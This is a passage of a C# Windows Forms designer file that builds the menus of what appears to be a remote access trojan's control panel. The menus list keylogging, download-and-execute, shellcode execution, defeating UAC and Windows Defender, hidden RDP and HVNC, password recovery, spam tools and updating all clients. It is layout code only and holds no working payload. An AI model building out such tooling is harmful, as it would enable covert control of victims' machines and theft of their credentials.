            this.loadForm.SetDecoration(this.guna2ContextMenuStrip2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.guna2ContextMenuStrip2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2ContextMenuStrip2.Font = new System.Drawing.Font("Century Gothic", 11.25F);
            this.guna2ContextMenuStrip2.ImageScalingSize = new System.Drawing.Size(29, 29);
            this.guna2ContextMenuStrip2.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.toolStripMenuItem61,
            this.toolStripMenuItem62,
            this.toolStripMenuItem63,
            this.toolStripMenuItem64,
            this.toolStripMenuItem65,
            this.toolStripMenuItem66,
            this.toolStripMenuItem67,
            this.toolStripMenuItem68,
            this.toolStripMenuItem69,
            this.toolStripMenuItem70});
            this.guna2ContextMenuStrip2.Margin = new System.Windows.Forms.Padding(3);
            this.guna2ContextMenuStrip2.Name = "guna2ContextMenuStrip1";
            this.guna2ContextMenuStrip2.RenderStyle.ArrowColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.guna2ContextMenuStrip2.RenderStyle.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.guna2ContextMenuStrip2.RenderStyle.ColorTable = null;
            this.guna2ContextMenuStrip2.RenderStyle.RoundedEdges = true;
            this.guna2ContextMenuStrip2.RenderStyle.SelectionArrowColor = System.Drawing.Color.White;
            this.guna2ContextMenuStrip2.RenderStyle.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.guna2ContextMenuStrip2.RenderStyle.SelectionForeColor = System.Drawing.Color.White;
            this.guna2ContextMenuStrip2.RenderStyle.SeparatorColor = System.Drawing.Color.Gainsboro;
            this.guna2ContextMenuStrip2.RenderStyle.TextRenderingHint = System.Drawing.Text.TextRenderingHint.SystemDefault;
            this.guna2ContextMenuStrip2.Size = new System.Drawing.Size(296, 364);
            // 
            // toolStripMenuItem61
            // 
            this.toolStripMenuItem61.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem61.Image = ((System.Drawing.Image)(resources.GetObject("toolStripMenuItem61.Image")));
            this.toolStripMenuItem61.Name = "toolStripMenuItem61";
            this.toolStripMenuItem61.Size = new System.Drawing.Size(295, 36);
            this.toolStripMenuItem61.Text = "      Download & Execute";
            this.toolStripMenuItem61.Click += new System.EventHandler(this.sendFileFromUrlToolStripMenuItem_Click);
            // 
            // toolStripMenuItem62
            // 
            this.toolStripMenuItem62.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem62.Image = ((System.Drawing.Image)(resources.GetObject("toolStripMenuItem62.Image")));
            this.toolStripMenuItem62.Name = "toolStripMenuItem62";
            this.toolStripMenuItem62.Size = new System.Drawing.Size(295, 36);
            this.toolStripMenuItem62.Text = "      Browse & Execute";
            this.toolStripMenuItem62.Click += new System.EventHandler(this.DownloadAndExecuteToolStripMenuItem_Click);
            // 
            // toolStripMenuItem63
            // 
            this.toolStripMenuItem63.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem63.Image = ((System.Drawing.Image)(resources.GetObject("toolStripMenuItem63.Image")));
            this.toolStripMenuItem63.Name = "toolStripMenuItem63";
            this.toolStripMenuItem63.Size = new System.Drawing.Size(295, 36);
            this.toolStripMenuItem63.Text = "      Execute to Memory";
            this.toolStripMenuItem63.Click += new System.EventHandler(this.SENDFILETOMEMORYToolStripMenuItem1_Click);
            // 
            // toolStripMenuItem64
            // 
            this.toolStripMenuItem64.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem64.Image = ((System.Drawing.Image)(resources.GetObject("toolStripMenuItem64.Image")));
            this.toolStripMenuItem64.Name = "toolStripMenuItem64";
            this.toolStripMenuItem64.Size = new System.Drawing.Size(295, 36);
            this.toolStripMenuItem64.Text = "      Persistence  Defeat UAC";
            this.toolStripMenuItem64.Visible = false;
            this.toolStripMenuItem64.Click += new System.EventHandler(this.disableUACToolStripMenuItem1_Click);
            // 
            // toolStripMenuItem65
            // 
            this.toolStripMenuItem65.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem65.Image = ((System.Drawing.Image)(resources.GetObject("toolStripMenuItem65.Image")));
            this.toolStripMenuItem65.Name = "toolStripMenuItem65";
            this.toolStripMenuItem65.Size = new System.Drawing.Size(295, 36);
            this.toolStripMenuItem65.Text = "      Persistence  Defeat WD";
            this.toolStripMenuItem65.Click += new System.EventHandler(this.disableWDToolStripMenuItem1_Click);
            // 
            // toolStripMenuItem66
            // 
            this.toolStripMenuItem66.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem66.Image = ((System.Drawing.Image)(resources.GetObject("toolStripMenuItem66.Image")));
            this.toolStripMenuItem66.Name = "toolStripMenuItem66";
            this.toolStripMenuItem66.Size = new System.Drawing.Size(295, 36);
            this.toolStripMenuItem66.Text = "      Persistence Schtask";
            this.toolStripMenuItem66.Click += new System.EventHandler(this.installSchtaskToolStripMenuItem_Click);
            // 
            // toolStripMenuItem67
            // 
            this.toolStripMenuItem67.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem67.Image = ((System.Drawing.Image)(resources.GetObject("toolStripMenuItem67.Image")));
            this.toolStripMenuItem67.Name = "toolStripMenuItem67";
            this.toolStripMenuItem67.Size = new System.Drawing.Size(295, 36);
            this.toolStripMenuItem67.Text = "      Update all clients";
            this.toolStripMenuItem67.Click += new System.EventHandler(this.UPDATEToolStripMenuItem1_Click);
            // 
            // toolStripMenuItem68
            // 
            this.toolStripMenuItem68.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem68.Image = ((System.Drawing.Image)(resources.GetObject("toolStripMenuItem68.Image")));
            this.toolStripMenuItem68.Name = "toolStripMenuItem68";
            this.toolStripMenuItem68.Size = new System.Drawing.Size(295, 36);
            this.toolStripMenuItem68.Text = "      Task Keylogger";
            this.toolStripMenuItem68.Click += new System.EventHandler(this.toolStripMenuItem68_Click);
            // 
            // toolStripMenuItem69
            // 
            this.toolStripMenuItem69.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem69.Image = ((System.Drawing.Image)(resources.GetObject("toolStripMenuItem69.Image")));
            this.toolStripMenuItem69.Name = "toolStripMenuItem69";
            this.toolStripMenuItem69.Size = new System.Drawing.Size(295, 36);
            this.toolStripMenuItem69.Text = "      Fake Binder";
            this.toolStripMenuItem69.Visible = false;
            this.toolStripMenuItem69.Click += new System.EventHandler(this.fakeBinderToolStripMenuItem_Click);
            // 
            // toolStripMenuItem70
            // 
            this.toolStripMenuItem70.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem70.Image = ((System.Drawing.Image)(resources.GetObject("toolStripMenuItem70.Image")));
            this.toolStripMenuItem70.Name = "toolStripMenuItem70";
            this.toolStripMenuItem70.Size = new System.Drawing.Size(295, 36);
            this.toolStripMenuItem70.Text = "      Delete";
            this.toolStripMenuItem70.Click += new System.EventHandler(this.DELETETASKToolStripMenuItem_Click);
            // 
            // listView2
            // 
            this.listView2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.listView2.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.listView2.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
            this.columnHeader1,
            this.columnHeader2});
            this.listView2.ContextMenuStrip = this.guna2ContextMenuStrip3;
            this.guna2Transition3.SetDecoration(this.listView2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.loadForm.SetDecoration(this.listView2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.listView2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.listView2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.listView2.Dock = System.Windows.Forms.DockStyle.Right;
            this.listView2.ForeColor = System.Drawing.Color.White;
            this.listView2.FullRowSelect = true;
            this.listView2.HideSelection = false;
            this.listView2.Location = new System.Drawing.Point(968, 0);
            this.listView2.Margin = new System.Windows.Forms.Padding(2);
            this.listView2.Name = "listView2";
            this.listView2.ShowGroups = false;
            this.listView2.ShowItemToolTips = true;
            this.listView2.Size = new System.Drawing.Size(577, 747);
            this.listView2.TabIndex = 2;
            this.listView2.UseCompatibleStateImageBehavior = false;
            this.listView2.View = System.Windows.Forms.View.Details;
            // 
            // columnHeader1
            // 
            this.columnHeader1.Text = "Time";
            this.columnHeader1.Width = 128;
            // 
            // columnHeader2
            // 
            this.columnHeader2.Text = "Logs";
            this.columnHeader2.Width = 105;
            // 
            // guna2ContextMenuStrip3
            // 
            this.guna2ContextMenuStrip3.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.guna2Transition1.SetDecoration(this.guna2ContextMenuStrip3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2ContextMenuStrip3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.loadForm.SetDecoration(this.guna2ContextMenuStrip3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.guna2ContextMenuStrip3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2ContextMenuStrip3.Font = new System.Drawing.Font("Century Gothic", 11.25F);
            this.guna2ContextMenuStrip3.ImageScalingSize = new System.Drawing.Size(29, 29);
            this.guna2ContextMenuStrip3.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.toolStripMenuItem48,
            this.copySelectedToolStripMenuItem});
            this.guna2ContextMenuStrip3.Margin = new System.Windows.Forms.Padding(3);
            this.guna2ContextMenuStrip3.Name = "guna2ContextMenuStrip1";
            this.guna2ContextMenuStrip3.RenderStyle.ArrowColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.guna2ContextMenuStrip3.RenderStyle.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.guna2ContextMenuStrip3.RenderStyle.ColorTable = null;
            this.guna2ContextMenuStrip3.RenderStyle.RoundedEdges = true;
            this.guna2ContextMenuStrip3.RenderStyle.SelectionArrowColor = System.Drawing.Color.White;
            this.guna2ContextMenuStrip3.RenderStyle.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.guna2ContextMenuStrip3.RenderStyle.SelectionForeColor = System.Drawing.Color.White;
            this.guna2ContextMenuStrip3.RenderStyle.SeparatorColor = System.Drawing.Color.Gainsboro;
            this.guna2ContextMenuStrip3.RenderStyle.TextRenderingHint = System.Drawing.Text.TextRenderingHint.SystemDefault;
            this.guna2ContextMenuStrip3.Size = new System.Drawing.Size(225, 76);
            // 
            // toolStripMenuItem48
            // 
            this.toolStripMenuItem48.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem48.Image = ((System.Drawing.Image)(resources.GetObject("toolStripMenuItem48.Image")));
            this.toolStripMenuItem48.Name = "toolStripMenuItem48";
            this.toolStripMenuItem48.Size = new System.Drawing.Size(224, 36);
            this.toolStripMenuItem48.Text = "      Clear Logs";
            this.toolStripMenuItem48.Click += new System.EventHandler(this.toolStripMenuItem48_Click);
            // 
            // copySelectedToolStripMenuItem
            // 
            this.copySelectedToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
            this.copySelectedToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("copySelectedToolStripMenuItem.Image")));
            this.copySelectedToolStripMenuItem.Name = "copySelectedToolStripMenuItem";
            this.copySelectedToolStripMenuItem.Size = new System.Drawing.Size(224, 36);
            this.copySelectedToolStripMenuItem.Text = "      Copy Selected";
            this.copySelectedToolStripMenuItem.Click += new System.EventHandler(this.copySelectedToolStripMenuItem_Click);
            // 
            // toolStripMenuItem14
            // 
            this.toolStripMenuItem14.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.toolStripMenuItem14.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem14.Name = "toolStripMenuItem14";
            this.toolStripMenuItem14.Size = new System.Drawing.Size(204, 36);
            this.toolStripMenuItem14.Text = "     Send File";
            // 
            // toolStripMenuItem15
            // 
            this.toolStripMenuItem15.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.toolStripMenuItem15.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem15.Name = "toolStripMenuItem15";
            this.toolStripMenuItem15.Size = new System.Drawing.Size(219, 36);
            this.toolStripMenuItem15.Text = "     From Url";
            this.toolStripMenuItem15.Click += new System.EventHandler(this.fromUrlToolStripMenuItem_Click);
            // 
            // toolStripMenuItem16
            // 
            this.toolStripMenuItem16.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.toolStripMenuItem16.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem16.Name = "toolStripMenuItem16";
            this.toolStripMenuItem16.Size = new System.Drawing.Size(219, 36);
            this.toolStripMenuItem16.Text = "     Send File To Disk";
            this.toolStripMenuItem16.Click += new System.EventHandler(this.SendFileToDiskToolStripMenuItem_Click);
            // 
            // toolStripMenuItem17
            // 
            this.toolStripMenuItem17.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.toolStripMenuItem17.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem17.Name = "toolStripMenuItem17";
            this.toolStripMenuItem17.Size = new System.Drawing.Size(219, 36);
            this.toolStripMenuItem17.Text = "     Send File To Memory";
            this.toolStripMenuItem17.Click += new System.EventHandler(this.SendFileToMemoryToolStripMenuItem_Click);
            // 
            // toolStripMenuItem18
            // 
            this.toolStripMenuItem18.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.toolStripMenuItem18.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem18.Name = "toolStripMenuItem18";
            this.toolStripMenuItem18.Size = new System.Drawing.Size(204, 36);
            this.toolStripMenuItem18.Text = "     Run Shellcode";
            this.toolStripMenuItem18.Click += new System.EventHandler(this.runShellcodeToolStripMenuItem_Click);
            // 
            // toolStripMenuItem19
            // 
            this.toolStripMenuItem19.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.toolStripMenuItem19.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem19.Name = "toolStripMenuItem19";
            this.toolStripMenuItem19.Size = new System.Drawing.Size(204, 36);
            this.toolStripMenuItem19.Text = "     MessageBox";
            this.toolStripMenuItem19.Click += new System.EventHandler(this.MessageBoxToolStripMenuItem_Click);
            // 
            // toolStripMenuItem20
            // 
            this.toolStripMenuItem20.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.toolStripMenuItem20.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem20.Name = "toolStripMenuItem20";
            this.toolStripMenuItem20.Size = new System.Drawing.Size(204, 36);
            this.toolStripMenuItem20.Text = "     Chat Room";
            this.toolStripMenuItem20.Click += new System.EventHandler(this.ChatToolStripMenuItem1_Click);
            // 
            // toolStripMenuItem21
            // 
            this.toolStripMenuItem21.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.toolStripMenuItem21.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem21.Name = "toolStripMenuItem21";
            this.toolStripMenuItem21.Size = new System.Drawing.Size(204, 36);
            this.toolStripMenuItem21.Text = "     Visit Website";
            this.toolStripMenuItem21.Click += new System.EventHandler(this.VisteWebsiteToolStripMenuItem1_Click);
            // 
            // toolStripMenuItem22
            // 
            this.toolStripMenuItem22.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.toolStripMenuItem22.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem22.Image = ((System.Drawing.Image)(resources.GetObject("toolStripMenuItem22.Image")));
            this.toolStripMenuItem22.Name = "toolStripMenuItem22";
            this.toolStripMenuItem22.Size = new System.Drawing.Size(204, 36);
            this.toolStripMenuItem22.Text = "     Change Wallpaper";
            this.toolStripMenuItem22.Click += new System.EventHandler(this.ChangeWallpaperToolStripMenuItem1_Click);
            // 
            // toolStripMenuItem23
            // 
            this.toolStripMenuItem23.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.toolStripMenuItem23.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem23.Name = "toolStripMenuItem23";
            this.toolStripMenuItem23.Size = new System.Drawing.Size(204, 36);
            this.toolStripMenuItem23.Text = "     Keylogger";
            this.toolStripMenuItem23.Click += new System.EventHandler(this.KeyloggerToolStripMenuItem1_Click);
            // 
            // toolStripMenuItem24
            // 
            this.toolStripMenuItem24.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.toolStripMenuItem24.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem24.Name = "toolStripMenuItem24";
            this.toolStripMenuItem24.Size = new System.Drawing.Size(204, 36);
            this.toolStripMenuItem24.Text = "     File Search";
            this.toolStripMenuItem24.Click += new System.EventHandler(this.FileSearchToolStripMenuItem_Click);
            // 
            // guna2ContextMenuStrip1
            // 
            this.guna2ContextMenuStrip1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.guna2Transition1.SetDecoration(this.guna2ContextMenuStrip1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2ContextMenuStrip1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.loadForm.SetDecoration(this.guna2ContextMenuStrip1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.guna2ContextMenuStrip1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2ContextMenuStrip1.Font = new System.Drawing.Font("Century Gothic", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2ContextMenuStrip1.ImageScalingSize = new System.Drawing.Size(29, 29);
            this.guna2ContextMenuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.tasksControlToolStripMenuItem,
            this.toolStripMenuItem1,
            this.priviligeEscalationFirewallToolStripMenuItem,
            this.toolStripMenuItem13,
            this.reverseProxyToolStripMenuItem,
            this.toolStripMenuItem33,
            this.hiddenRDPToolStripMenuItem,
            this.hVNChBrowsersToolStripMenuItem,
            this.toolStripMenuItem49,
            this.passwordRecoveryToolStripMenuItem,
            this.toolStripMenuItem56,
            this.spamToolsToolStripMenuItem,
            this.toolStripMenuItem57,
            this.toolStripMenuItem58});
            this.guna2ContextMenuStrip1.Margin = new System.Windows.Forms.Padding(3);
            this.guna2ContextMenuStrip1.Name = "guna2ContextMenuStrip1";
            this.guna2ContextMenuStrip1.RenderStyle.ArrowColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.guna2ContextMenuStrip1.RenderStyle.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.guna2ContextMenuStrip1.RenderStyle.ColorTable = null;
            this.guna2ContextMenuStrip1.RenderStyle.RoundedEdges = false;
            this.guna2ContextMenuStrip1.RenderStyle.SelectionArrowColor = System.Drawing.Color.Black;
            this.guna2ContextMenuStrip1.RenderStyle.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.guna2ContextMenuStrip1.RenderStyle.SelectionForeColor = System.Drawing.Color.White;
            this.guna2ContextMenuStrip1.RenderStyle.SeparatorColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.guna2ContextMenuStrip1.RenderStyle.TextRenderingHint = System.Drawing.Text.TextRenderingHint.SingleBitPerPixelGridFit;
            this.guna2ContextMenuStrip1.Size = new System.Drawing.Size(354, 530);
            // 
            // tasksControlToolStripMenuItem
            // 
            this.tasksControlToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.onToolStripMenuItem,
            this.offToolStripMenuItem});
            this.tasksControlToolStripMenuItem.Enabled = false;
            this.tasksControlToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
            this.tasksControlToolStripMenuItem.Name = "tasksControlToolStripMenuItem";
            this.tasksControlToolStripMenuItem.Size = new System.Drawing.Size(353, 36);
            this.tasksControlToolStripMenuItem.Text = "      [On join Tasks/Logs System]";
            this.tasksControlToolStripMenuItem.Visible = false;
            this.tasksControlToolStripMenuItem.Click += new System.EventHandler(this.tasksControlToolStripMenuItem_Click);
            // 
            // onToolStripMenuItem
            // 
            this.onToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.onToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
            this.onToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("onToolStripMenuItem.Image")));
            this.onToolStripMenuItem.Name = "onToolStripMenuItem";
            this.onToolStripMenuItem.Size = new System.Drawing.Size(163, 36);
            this.onToolStripMenuItem.Text = "     On/Off";
            this.onToolStripMenuItem.Click += new System.EventHandler(this.onToolStripMenuItem_Click);
            // 
            // offToolStripMenuItem
            // 
            this.offToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.offToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
            this.offToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("offToolStripMenuItem.Image")));
            this.offToolStripMenuItem.Name = "offToolStripMenuItem";
            this.offToolStripMenuItem.Size = new System.Drawing.Size(163, 36);
            this.offToolStripMenuItem.Text = "     Stop";
            this.offToolStripMenuItem.Visible = false;
            this.offToolStripMenuItem.Click += new System.EventHandler(this.offToolStripMenuItem_Click);
            // 
            // toolStripMenuItem1
            // 
            this.toolStripMenuItem1.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.toolStripMenuItem2,
            this.toolStripMenuItem3,
            this.toolStripMenuItem4,
            this.toolStripMenuItem5,
            this.toolStripMenuItem6,
            this.toolStripMenuItem81,
            this.toolStripMenuItem7,
            this.toolStripMenuItem8,
            this.toolStripMenuItem9,
            this.toolStripMenuItem10,
            this.toolStripMenuItem76,
            this.toolStripMenuItem77,
            this.toolStripMenuItem79,
            this.remoteReverseProxyToolStripMenuItem,
            this.protectionToolStripMenuItem,
            this.toolStripMenuItem54,
            this.toolStripMenuItem55});
            this.toolStripMenuItem1.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem1.Image = ((System.Drawing.Image)(resources.GetObject("toolStripMenuItem1.Image")));
            this.toolStripMenuItem1.Name = "toolStripMenuItem1";
            this.toolStripMenuItem1.Size = new System.Drawing.Size(353, 36);
            this.toolStripMenuItem1.Text = "      [Remote Control]";
            // 
            // toolStripMenuItem2
            // 
            this.toolStripMenuItem2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.toolStripMenuItem2.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.cmdToolStripMenuItem,
            this.powershellToolStripMenuItem});
            this.toolStripMenuItem2.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem2.Name = "toolStripMenuItem2";
            this.toolStripMenuItem2.Size = new System.Drawing.Size(252, 24);
            this.toolStripMenuItem2.Text = "Remote Console";
            // 
            // cmdToolStripMenuItem
            // 
            this.cmdToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.cmdToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
            this.cmdToolStripMenuItem.Name = "cmdToolStripMenuItem";
            this.cmdToolStripMenuItem.Size = new System.Drawing.Size(157, 24);
            this.cmdToolStripMenuItem.Text = "Cmd";
            this.cmdToolStripMenuItem.Click += new System.EventHandler(this.cmdToolStripMenuItem_Click);
            // 
            // powershellToolStripMenuItem
            // 
            this.powershellToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.powershellToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
            this.powershellToolStripMenuItem.Name = "powershellToolStripMenuItem";
            this.powershellToolStripMenuItem.Size = new System.Drawing.Size(157, 24);
            this.powershellToolStripMenuItem.Text = "Powershell";
            this.powershellToolStripMenuItem.Visible = false;
            this.powershellToolStripMenuItem.Click += new System.EventHandler(this.powershellToolStripMenuItem_Click);
            // 
            // toolStripMenuItem3
            // 
            this.toolStripMenuItem3.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.toolStripMenuItem3.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem3.Name = "toolStripMenuItem3";
            this.toolStripMenuItem3.Size = new System.Drawing.Size(252, 24);
            this.toolStripMenuItem3.Text = "Remote Desktop";
            this.toolStripMenuItem3.Click += new System.EventHandler(this.RemoteScreenToolStripMenuItem_Click);
            // 
            // toolStripMenuItem4
            // 
            this.toolStripMenuItem4.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.toolStripMenuItem4.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem4.Name = "toolStripMenuItem4";
            this.toolStripMenuItem4.Size = new System.Drawing.Size(252, 24);
            this.toolStripMenuItem4.Text = "Remote Camera";
            this.toolStripMenuItem4.Click += new System.EventHandler(this.RemoteCameraToolStripMenuItem_Click);
            // 
            // toolStripMenuItem5
            // 
            this.toolStripMenuItem5.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.toolStripMenuItem5.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem5.Name = "toolStripMenuItem5";
            this.toolStripMenuItem5.Size = new System.Drawing.Size(252, 24);
            this.toolStripMenuItem5.Text = "Remote Regedit";
            this.toolStripMenuItem5.Click += new System.EventHandler(this.remoteRegeditToolStripMenuItem_Click);
            // 
            // toolStripMenuItem6
            // 
            this.toolStripMenuItem6.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.toolStripMenuItem6.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem6.Name = "toolStripMenuItem6";
            this.toolStripMenuItem6.Size = new System.Drawing.Size(252, 24);
            this.toolStripMenuItem6.Text = "File Manager";
            this.toolStripMenuItem6.Click += new System.EventHandler(this.FileManagerToolStripMenuItem1_Click);
            // 
            // toolStripMenuItem81
            // 
            this.toolStripMenuItem81.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.toolStripMenuItem81.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem81.Name = "toolStripMenuItem81";
            this.toolStripMenuItem81.Size = new System.Drawing.Size(252, 24);
            this.toolStripMenuItem81.Text = "File Search";
            this.toolStripMenuItem81.Click += new System.EventHandler(this.FileSearchToolStripMenuItem_Click);
            // 
            // toolStripMenuItem7
            // 
            this.toolStripMenuItem7.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.toolStripMenuItem7.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem7.Name = "toolStripMenuItem7";
            this.toolStripMenuItem7.Size = new System.Drawing.Size(252, 24);
            this.toolStripMenuItem7.Text = "Process Manager";
            this.toolStripMenuItem7.Click += new System.EventHandler(this.ProcessManagerToolStripMenuItem_Click);
            // 
            // toolStripMenuItem8
            // 
            this.toolStripMenuItem8.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.toolStripMenuItem8.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem8.Name = "toolStripMenuItem8";
            this.toolStripMenuItem8.Size = new System.Drawing.Size(252, 24);
            this.toolStripMenuItem8.Text = "Connections";
            this.toolStripMenuItem8.Click += new System.EventHandler(this.netstatToolStripMenuItem_Click);
            // 
            // toolStripMenuItem9
            // 
